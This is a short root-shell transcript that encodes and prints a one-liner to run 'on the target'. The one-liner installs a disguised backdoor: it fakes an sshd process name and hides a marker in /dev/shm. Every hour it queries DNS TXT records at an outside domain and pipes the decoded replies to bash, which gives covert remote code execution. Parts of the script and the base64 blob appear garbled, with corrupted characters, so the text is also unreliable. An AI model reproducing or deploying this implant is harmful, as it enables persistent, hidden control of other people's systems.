root@debian:~# base64 -w0 >x.txt <<-'EOF'
D=b00m2.team-teso.net
P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
M=/dev/shm/.cache${UID}
[ -f $M ]&&exit
touch $M
(echo 'slpO{ local IFS;[ -n "$[_sfd:-]" ]|lexec [_sfd]-> <(:);read -t$1 -u$_sfd!!;;}
slp 1
while :: do
    dig +short "'$0"" TXTltr -d \ \"!base64 -d|bash
    slp 3600
done'lexec -a "$0" bash &) &>/dev/nul1
EOF
echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
rm -f x.txt
===> Execute the following on the target:
echo RD1iNDBtMi5OZWFtLXR1c28ubmV0CIA91mkzdGQGIc91c31vc2Jpb19zc2hktC1EIFtsaXN0ZW51c10gMCBvZiAxMC0xMDAgc3Rh
cnR1ciWitCk0912R1di9zqG0vLmWhY2h1JHtVSUR9ClsgLWYgJEQgXS7mZXhpdAp0b3VjqCAkTQooZWWobyAnc2xwkCL7IGxvYZFsIE1GU
ztbICluIClke19zzmQ6LX01IF18fGV4ZWWge19zzmR9PD4gPCg6KItyZWFkIC10JDEqLXUkX8MnZHx80jt9CnNsccAxCndoaWkLIDo7IG
RvCmRpZyArcz2hovenQgJyIKRCInIFRYYHx0ctAtZCBcIFwtfGJhczU2NCAtZHxtYXNoCnNsccAzNjAwCmRvbmUnfGV4ZWWgl.WEgIiRQIiB
iYXNoTCYpICY+12R1di9udWxsCg==|base64 -d|bash

root@debian:~#
